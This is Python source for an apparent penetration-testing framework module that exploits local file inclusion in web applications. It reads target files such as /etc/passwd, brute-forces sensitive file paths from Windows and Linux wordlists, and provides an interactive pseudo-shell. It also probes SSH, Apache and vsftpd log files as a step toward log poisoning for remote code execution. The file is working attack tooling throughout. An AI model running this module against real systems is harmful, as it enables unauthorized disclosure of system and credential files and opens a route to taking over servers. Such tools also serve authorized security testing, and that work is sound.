from core.framework.base_module import BaseModule
from core.framework.option import OptString, OptPort, OptBool
from core.framework.failure import ProcedureError
from core.output_handler import (
    print_info,
    print_error,
    print_success,
    print_status,
)
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.shortcuts import prompt, CompleteStyle
import os
import difflib
import re
from pathlib import Path
from typing import Optional, List, Dict, Any


class Lfi(BaseModule):

    file_read = OptString("/etc/passwd", "file to read in lfi", required=True)
    shell_lfi = OptBool(False, "Start lfi pseudo shell", required=False)
    
    # Wordlist paths configuration
    WORDLIST_PATHS = {
        'win_small': "data/wordlists/lfi/win_small.txt",
        'win_big': "data/wordlists/lfi/win_big.txt", 
        'linux': "data/wordlists/lfi/linux.txt"
    }
    
    # Poisoning payloads
    POISONING_PAYLOADS = {
        'ssh': '/var/log/auth.log',
        'apache': '/var/log/apache2/access.log',
        'vsftp': '/var/log/vsftpd.log'
    }

    def handler_lfi(self):
        """
        Main handler for LFI operations.
        
        Either executes a single file read operation or starts an interactive
        pseudo-shell for advanced LFI testing.
        """
        if self.shell_lfi:
            self._start_lfi_shell()
        else:
            self._execute_single_file_read()

    def _execute_single_file_read(self):
        """Execute a single file read operation."""
        try:
            output = self.execute(self.file_read)
            if output:
                print_info(output)
            else:
                print_error("Failed to read file or no output received")
        except Exception as e:
            print_error(f"Error reading file: {e}")

    def _check_files_from_wordlist(self, wordlist_name: str) -> None:

        if wordlist_name not in self.WORDLIST_PATHS:
            print_error(f"Unknown wordlist: {wordlist_name}")
            return
            
        wordlist_path = self.WORDLIST_PATHS[wordlist_name]
        
        try:
            if not Path(wordlist_path).exists():
                print_error(f"Wordlist file not found: {wordlist_path}")
                return
                
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                print_status(f"Files found with {len(lines)} lines")
                
                for line in lines:
                    file_path = line.strip()
                    if not file_path:  # Skip empty lines
                        continue
                        
                    try:
                        output = self.execute(file_path)
                        if output and self._is_valid_output(output):
                            print_success(file_path)
                    except Exception as e:
                        print_error(f"Error testing {file_path}: {e}")
                        
        except FileNotFoundError:
            print_error(f"File {wordlist_path} not found")
        except PermissionError:
            print_error(f"Permission denied accessing {wordlist_path}")
        except Exception as e:
            print_error(f"Unexpected error: {e}")

    def _is_valid_output(self, output: str) -> bool:
        """
        Check if the output is valid (not empty and not an error page).
        
        Args:
            output: The output string to validate
            
        Returns:
            True if output appears valid, False otherwise
        """
        if not output or len(output.strip()) < 10:
            return False
            
        # Check for common error indicators
        error_indicators = [
            '404 not found', 'file not found', 'access denied',
            'permission denied', 'error 500', 'internal server error'
        ]
        
        output_lower = output.lower()
        return not any(indicator in output_lower for indicator in error_indicators)

    def _start_lfi_shell(self):
        """Start the interactive LFI pseudo-shell."""
        if not hasattr(self, "execute"):
            self._show_execute_example()
            return
            
        help_commands = [
            "help", "exit", "?check_files_win_big", "?check_files_win_small", 
            "?check_files_linux", "?check_poisoning", "?ssh_poisoning",
            "?apache_poisoning", "?vsftp_poisoning", "?save"
        ]
        
        completer = WordCompleter(help_commands, ignore_case=True)
        history = InMemoryHistory()
        template = self.execute("")
        
        print_info()
        print_status("Welcome to lfi pseudo shell")
        print_status("Enter file name or help command")
        print_info()
        
        while True:
            command = prompt(
                "lfi shell> ",
                completer=completer,
                complete_in_thread=True,
                complete_while_typing=True,
                complete_style=CompleteStyle.READLINE_LIKE,
                history=history,
            )
            
            if command == "":
                continue
            elif command == "exit":
                break
            elif command == "help":
                self._show_help_menu()
            elif command == "?check_files_win_small":
                self._check_files_from_wordlist('win_small')
            elif command == "?check_files_win_big":
                self._check_files_from_wordlist('win_big')
            elif command == "?check_files_linux":
                self._check_files_from_wordlist('linux')
            elif command == "?check_poisoning":
                self._check_poisoning()
            elif command == "?ssh_poisoning":
                self._check_ssh_poisoning()
            elif command == "?apache_poisoning":
                self._check_apache_poisoning()
            elif command == "?vsftp_poisoning":
                self._check_vsftp_poisoning()
            elif command.startswith("?save "):
                self._save_file(command[6:])
            else:
                self._execute_command(command, template)

    def _show_help_menu(self):
        """Display the help menu for the LFI shell."""
        print_info()
        print_info("\thelp menu lfi")
        print_info("\t-------------")
        print_info("\t?check_files_win_big                 Run big windows files")
        print_info("\t?check_files_win_small               Run little files")
        print_info("\t?check_files_linux                   Run linux files")
        print_info("\t?check_poisoning                     Check poisoning")
        print_info("\t?ssh_poisoning                       Check ssh poisoning")
        print_info("\t?apache_poisoning                    Check apache poisoning")
        print_info("\t?vsftp_poisoning                     Check vsftp poisoning")
        print_info("\t?save <filename>                     Saves the file on disk")
        print_info()

    def _execute_command(self, command: str, template: str):
        """Execute a custom command and display the output."""
        try:
            command_output = self.execute(command)
            if command_output:
                output = self._compare_texts(command_output, template)
                if output:
                    print_info(output)
            else:
                print_error("No output received")
        except Exception as e:
            print_error(f"Error executing command: {e}")

    def _check_poisoning(self):
        """Check for log poisoning vulnerabilities."""
        print_status("Checking for log poisoning vulnerabilities...")
        for poison_type, log_path in self.POISONING_PAYLOADS.items():
            try:
                output = self.execute(log_path)
                if output and self._is_valid_output(output):
                    print_success(f"Found {poison_type} log: {log_path}")
                else:
                    print_info(f"No access to {poison_type} log: {log_path}")
            except Exception as e:
                print_error(f"Error checking {poison_type} poisoning: {e}")

    def _check_ssh_poisoning(self):
        """Check specifically for SSH log poisoning."""
        print_status("Checking SSH log poisoning...")
        self._check_specific_poisoning('ssh')

    def _check_apache_poisoning(self):
        """Check specifically for Apache log poisoning."""
        print_status("Checking Apache log poisoning...")
        self._check_specific_poisoning('apache')

    def _check_vsftp_poisoning(self):
        """Check specifically for vsFTPd log poisoning."""
        print_status("Checking vsFTPd log poisoning...")
        self._check_specific_poisoning('vsftp')

    def _check_specific_poisoning(self, poison_type: str):
        """Check for a specific type of log poisoning."""
        if poison_type not in self.POISONING_PAYLOADS:
            print_error(f"Unknown poisoning type: {poison_type}")
            return
            
        log_path = self.POISONING_PAYLOADS[poison_type]
        try:
            output = self.execute(log_path)
            if output and self._is_valid_output(output):
                print_success(f"Found {poison_type} log: {log_path}")
                print_info("You can try to poison this log for RCE")
            else:
                print_info(f"No access to {poison_type} log: {log_path}")
        except Exception as e:
            print_error(f"Error checking {poison_type} poisoning: {e}")

    def _save_file(self, filename: str):
        """Save the last executed command output to a file."""
        if not filename:
            print_error("Please specify a filename")
            return
            
        try:
            # Get the last command output (this is a simplified implementation)
            output = self.execute("")
            if output:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(output)
                print_success(f"Output saved to {filename}")
            else:
                print_error("No output to save")
        except Exception as e:
            print_error(f"Error saving file: {e}")

    def _compare_texts(self, text1: str, text2: str) -> str:
        """
        Compare two texts and return the differences.
        
        Args:
            text1: First text to compare
            text2: Second text to compare
            
        Returns:
            String containing the differences
        """
        if not text1 or not text2:
            return text1 or text2 or ""
            
        try:
            d = difflib.Differ()
            diff = list(d.compare(text1.splitlines(), text2.splitlines()))
            unique_lines = [line[2:] for line in diff if line.startswith("- ")]
            return "\n".join(unique_lines)
        except Exception as e:
            print_error(f"Error comparing texts: {e}")
            return text1
